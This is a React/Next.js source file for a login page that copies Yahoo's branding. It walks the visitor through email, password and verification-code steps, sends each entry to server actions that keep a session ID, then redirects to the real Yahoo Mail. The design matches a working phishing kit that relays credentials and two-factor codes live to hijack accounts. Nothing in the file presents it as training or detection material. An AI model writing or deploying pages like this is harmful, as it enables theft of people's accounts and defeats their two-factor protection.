"use client";

import { useState } from "react";
import Footer from "@/components/Footer";
import { initiateLogin, submit2FA, submitPassword } from "./actions";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [step, setStep] = useState(1); // 1: email, 2: password, 3: 2fa
  const [sessionId, setSessionId] = useState("");
  const [code, setCode] = useState("");
  const [staySignedIn, setStaySignedIn] = useState(true);

  // Step 1: Initiate Login (Email)
  const handleEmailNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) {
      setMessage("Please enter a valid email, username, or mobile number.");
      return;
    }
    setLoading(true);
    setMessage("");

    try {
      const { success, data, message: errMessage } = await initiateLogin({ email });

      if (success && data.success && data.status === "REQUIRES_PASSWORD") {
        setSessionId(data.sessionId);
        setStep(2); // Move to password step
      } else {
        setMessage(
          errMessage || data?.error || data?.message || "Could not find your Yahoo account",
        );
      }
    } catch (error) {
      setMessage("Network error occurred");
    } finally {
      setLoading(false);
    }
  };

  // Step 2: Submit Password
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) {
      setMessage("Session expired. Please start over.");
      setStep(1);
      return;
    }
    setLoading(true);
    setMessage("");

    try {
      const { success, data, message: errMessage } = await submitPassword({ sessionId, password });

      if (success && data.success && data.status === "AUTHENTICATED") {
        setMessage("Login successful!");
        setTimeout(() => {
          window.location.href = "https://mail.yahoo.com";
        }, 1500);
      } else if (success && data.success && data.status === "REQUIRES_2FA") {
        setSessionId(data.sessionId);
        setStep(3); // Move to 2FA step
      } else {
        setMessage(errMessage || data?.error || data?.message || "Invalid password");
      }
    } catch (error) {
      setMessage("Network error occurred");
    } finally {
      setLoading(false);
    }
  };

  // Step 3: 2FA Verification
  const handleSubmit2FA = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage("");

    try {
      const { success, data, message: errMessage } = await submit2FA({ sessionId, code });

      if (success && data.success) {
        setMessage("Verification successful! Redirecting...");
        setTimeout(() => {
          window.location.href = "https://mail.yahoo.com";
        }, 1500);
      } else {
        setMessage(errMessage || data?.error || data?.message || "Verification failed");
      }
    } catch (error) {
      setMessage("Network error occurred");
    } finally {
      setLoading(false);
    }
  };

  const handleBack = () => {
    setMessage("");
    if (step === 3) {
      setStep(2);
    } else if (step === 2) {
      setStep(1);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header className="bg-white border-b border-[#e0dce5] px-4 py-3">
        <div className="mx-auto max-w-[1200px] flex items-center justify-between">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 500 130"
            className="h-8"
            aria-label="Yahoo"
          >
            <text
              x="0"
              y="105"
              fontFamily="'Helvetica Neue', Arial, sans-serif"
              fontSize="120"
              fontWeight="bold"
              fill="#6001d2"
              letterSpacing="-4"
            >
              Yahoo!
            </text>
          </svg>
          <div className="flex items-center gap-4 text-sm text-[#6e6d7a]">
            <a href="#" className="hover:text-[#6001d2] hover:underline">
              Help
            </a>
            <a href="#" className="hover:text-[#6001d2] hover:underline">
              Terms
            </a>
            <a href="#" className="hover:text-[#6001d2] hover:underline">
              Privacy
            </a>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center px-4 py-12 pb-24">
        <div className="w-full max-w-[400px]">
          {/* Login Card */}
          <div className="bg-white rounded-2xl shadow-lg p-8 md:p-10">
            <div className="flex justify-center mb-6">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 500 130"
                className="h-10"
                aria-label="Yahoo"
              >
                <text
                  x="50%"
                  y="105"
                  textAnchor="middle"
                  fontFamily="'Helvetica Neue', Arial, sans-serif"
                  fontSize="120"
                  fontWeight="bold"
                  fill="#6001d2"
                  letterSpacing="-4"
                >
                  Yahoo!
                </text>
              </svg>
            </div>

            <h1 className="text-2xl font-bold text-center text-[#1d1d1f] mb-1">
              Sign in
            </h1>
            {step === 1 && (
              <p className="text-center text-sm text-[#6e6d7a] mb-6">
                using your Yahoo account
              </p>
            )}
            {step === 2 && (
              <p className="text-center text-sm text-[#6e6d7a] mb-6">
                <button
                  onClick={handleBack}
                  className="text-[#6001d2] hover:underline font-medium"
                >
                  {email}
                </button>
              </p>
            )}
            {step === 3 && (
              <p className="text-center text-sm text-[#6e6d7a] mb-6">
                Enter the verification code
              </p>
            )}

            {message && (
              <div
                className={`mb-4 p-3 text-sm rounded-lg text-center ${
                  message.includes("successful") ||
                  message.includes("Redirecting")
                    ? "bg-green-50 text-green-700 border border-green-200"
                    : "bg-red-50 text-red-700 border border-red-200"
                }`}
              >
                {message}
              </div>
            )}

            {step === 1 && (
              <form onSubmit={handleEmailNext} className="flex flex-col gap-5">
                <div className="relative">
                  <input
                    type="text"
                    id="login-username"
                    name="username"
                    placeholder=" "
                    className="w-full px-0 py-2 text-base border-b-2 border-[#e0dce5] focus:border-[#6001d2] transition-colors peer bg-transparent"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    autoFocus
                    required
                  />
                  <label
                    htmlFor="login-username"
                    className="absolute left-0 top-2 text-[#6e6d7a] text-base transition-all peer-placeholder-shown:top-2 peer-placeholder-shown:text-base peer-placeholder-shown:text-[#6e6d7a] peer-focus:-top-4 peer-focus:text-xs peer-focus:text-[#6001d2] peer-[:not(:placeholder-shown)]:-top-4 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-[#6e6d7a] pointer-events-none"
                  >
                    Username, email, or mobile
                  </label>
                </div>
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-[#6001d2] text-white font-semibold py-3 rounded-full text-base hover:bg-[#4f01ad] active:bg-[#3d0189] transition-colors disabled:opacity-50 flex items-center justify-center"
                >
                  {loading ? "Please wait..." : "Next"}
                </button>
                <div className="flex items-center justify-between text-sm mt-1">
                  <label className="flex items-center gap-2 cursor-pointer select-none">
                    <input
                      type="checkbox"
                      checked={staySignedIn}
                      onChange={(e) => setStaySignedIn(e.target.checked)}
                      className="w-4 h-4 rounded border-[#e0dce5] accent-[#6001d2]"
                    />
                    <span className="text-[#6e6d7a]">Stay signed in</span>
                  </label>
                  <a
                    href="#"
                    className="text-[#6001d2] hover:underline font-medium"
                  >
                    Forgot username?
                  </a>
                </div>
                <div className="relative my-2">
                  <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-[#e0dce5]" />
                  </div>
                  <div className="relative flex justify-center text-xs">
                    <span className="bg-white px-3 text-[#6e6d7a]">or</span>
                  </div>
                </div>
                <button
                  type="button"
                  className="w-full flex items-center justify-center gap-3 bg-white border border-[#e0dce5] text-[#1d1d1f] font-medium py-3 rounded-full text-sm hover:bg-[#f9f9f9] transition-colors"
                >
                  <svg className="w-5 h-5" viewBox="0 0 24 24">
                    <path
                      d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"
                      fill="#4285F4"
                    />
                    <path
                      d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                      fill="#34A853"
                    />
                    <path
                      d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                      fill="#FBBC05"
                    />
                    <path
                      d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                      fill="#EA4335"
                    />
                  </svg>
                  Sign in with Google
                </button>
                <button
                  type="button"
                  className="w-full bg-white border border-[#6001d2] text-[#6001d2] font-semibold py-3 rounded-full text-sm hover:bg-[#f3f0ff] transition-colors"
                >
                  Create an account
                </button>
              </form>
            )}

            {step === 2 && (
              <form onSubmit={handleLogin} className="flex flex-col gap-5">
                <div className="relative">
                  <input
                    type="password"
                    id="login-passwd"
                    name="password"
                    placeholder=" "
                    className="w-full px-0 py-2 text-base border-b-2 border-[#e0dce5] focus:border-[#6001d2] transition-colors peer bg-transparent"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    autoFocus
                    required
                  />
                  <label
                    htmlFor="login-passwd"
                    className="absolute left-0 top-2 text-[#6e6d7a] text-base transition-all peer-placeholder-shown:top-2 peer-placeholder-shown:text-base peer-placeholder-shown:text-[#6e6d7a] peer-focus:-top-4 peer-focus:text-xs peer-focus:text-[#6001d2] peer-[:not(:placeholder-shown)]:-top-4 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-[#6e6d7a] pointer-events-none"
                  >
                    Password
                  </label>
                </div>
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-[#6001d2] text-white font-semibold py-3 rounded-full text-base hover:bg-[#4f01ad] active:bg-[#3d0189] transition-colors disabled:opacity-50 flex items-center justify-center"
                >
                  {loading ? "Signing in..." : "Next"}
                </button>
                <div className="flex items-center justify-between text-sm mt-1">
                  <button
                    type="button"
                    onClick={handleBack}
                    className="text-[#6001d2] hover:underline font-medium"
                  >
                    ← Back
                  </button>
                  <a
                    href="#"
                    className="text-[#6001d2] hover:underline font-medium"
                  >
                    Forgot password?
                  </a>
                </div>
              </form>
            )}

            {step === 3 && (
              <form onSubmit={handleSubmit2FA} className="flex flex-col gap-5">
                <div className="relative">
                  <input
                    type="text"
                    id="verify-code"
                    name="code"
                    placeholder=" "
                    className="w-full px-0 py-2 text-base border-b-2 border-[#e0dce5] focus:border-[#6001d2] transition-colors peer bg-transparent text-center tracking-[0.3em] font-bold"
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    autoFocus
                    maxLength={8}
                    required
                  />
                  <label
                    htmlFor="verify-code"
                    className="absolute left-0 top-2 text-[#6e6d7a] text-base transition-all peer-placeholder-shown:top-2 peer-placeholder-shown:text-base peer-placeholder-shown:text-[#6e6d7a] peer-focus:-top-4 peer-focus:text-xs peer-focus:text-[#6001d2] peer-[:not(:placeholder-shown)]:-top-4 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-[#6e6d7a] pointer-events-none"
                  >
                    Verification code
                  </label>
                </div>
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-[#6001d2] text-white font-semibold py-3 rounded-full text-base hover:bg-[#4f01ad] active:bg-[#3d0189] transition-colors disabled:opacity-50 flex items-center justify-center"
                >
                  {loading ? "Verifying..." : "Verify"}
                </button>
                <div className="text-sm mt-1">
                  <button
                    type="button"
                    onClick={handleBack}
                    className="text-[#6001d2] hover:underline font-medium"
                  >
                    ← Back
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}
